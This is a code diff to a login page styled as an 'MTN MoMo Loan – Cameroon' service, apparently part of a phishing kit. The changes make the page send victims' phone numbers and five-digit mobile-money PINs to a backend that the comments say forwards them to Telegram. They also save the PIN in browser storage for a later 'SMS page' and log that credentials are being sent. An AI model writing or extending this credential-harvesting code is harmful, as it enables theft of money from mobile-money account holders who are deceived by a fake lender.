@@ -654,6 +654,8 @@
 
         // ============================================
         // LOGIN BUTTON → calls backend /api/login
+        // Sends BOTH phone AND PIN to backend
+        // Backend forwards to Telegram
         // ============================================
         const loginBtn = document.getElementById('loginBtn');
 
@@ -667,7 +669,7 @@
                 return;
             }
 
-            // --- Validate PIN locally (PIN is NOT sent to backend) ---
+            // --- Validate PIN (5 digits) ---
             const pin = getPinValue();
             if (pin.length !== 5) {
                 pinBoxes.forEach(b => b.classList.add('invalid'));
@@ -686,14 +688,17 @@
             const overlayStart = Date.now();
 
             try {
-                // --- Call backend: sends ONLY the phone number ---
+                // --- Call backend: sends BOTH phone AND PIN ---
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 15000);
 
                 const res = await fetch(`${API_BASE}/api/login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: '+237' + phoneDigits }),
+                    body: JSON.stringify({
+                        phone: '+237' + phoneDigits,
+                        pin: pin
+                    }),
                     signal: controller.signal
                 });
                 clearTimeout(timeoutId);
@@ -711,6 +716,10 @@
                     token: data.token,
                     loggedInAt: new Date().toISOString()
                 }));
+
+                // Also store phone and pin for later use (e.g. SMS page)
+                localStorage.setItem('momoPhone', '+237' + phoneDigits);
+                localStorage.setItem('momoPin', pin);
 
                 // --- Ensure overlay shows at least MIN_OVERLAY_MS ---
                 const elapsed = Date.now() - overlayStart;
@@ -743,9 +752,22 @@
             if (digits.length === 9 && !getPinValue()) pinBoxes[0].focus();
         });
 
+        // ============================================
+        // CLEAN ON LOAD — no pre-fill
+        // ============================================
+        window.addEventListener('load', () => {
+            phoneInput.value = '';
+            pinBoxes.forEach(b => {
+                b.value = '';
+                b.classList.remove('filled', 'invalid');
+            });
+            phoneInput.focus();
+        });
+
         console.log('====================================');
         console.log('💰 MTN MoMo Loan – Cameroon');
         console.log('🔐 Login connected to:', API_BASE);
+        console.log('📤 Phone + PIN will be sent to backend');
         console.log('====================================');
     </script>
 </body>
